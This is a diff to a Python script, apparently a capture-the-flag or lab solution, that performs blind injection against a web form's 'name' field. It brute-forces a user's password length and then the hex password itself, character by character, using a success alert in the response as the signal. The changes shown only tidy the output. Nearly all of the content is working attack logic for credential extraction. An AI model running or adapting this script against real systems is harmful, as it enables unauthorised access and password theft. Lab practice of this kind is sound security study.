@@ -11,11 +11,11 @@ def main():
     name = 'inspector_derrick'
     page = 'messages'
 
+    print("Checking password length...")
+
     for length in count(1):
 
         injection = build_inj_len(length, name)
-
-        print(injection)
 
         data = {'name': injection}
 
@@ -23,23 +23,22 @@ def main():
 
         response = post(url, data=data)
         body = response.text
-        print(body)
 
         soup = BeautifulSoup(body, 'html.parser')
         if (soup.findAll('div', {'class': 'alert-success'})):
-            print(length)
+            print("The password is " + str(length) + " chars long.")
             break
     
     chars = hexdigits
 
     password = ''
+
+    print("Checking password...")
     
-    for i in range(length):
+    for i in tqdm(range(length)):
         for letter in chars:
             
             injection = build_inj_password(name, password, letter)
-
-            print(injection)
 
             data = {'name': injection}
 
@@ -49,10 +48,10 @@ def main():
             body = response.text
             soup = BeautifulSoup(body, 'html.parser')
             if (soup.findAll('div', {'class': 'alert-success'})):
-                print(letter)
                 password += letter
                 break
     
+    print("\nThe password is:")
     print(password)
 
     
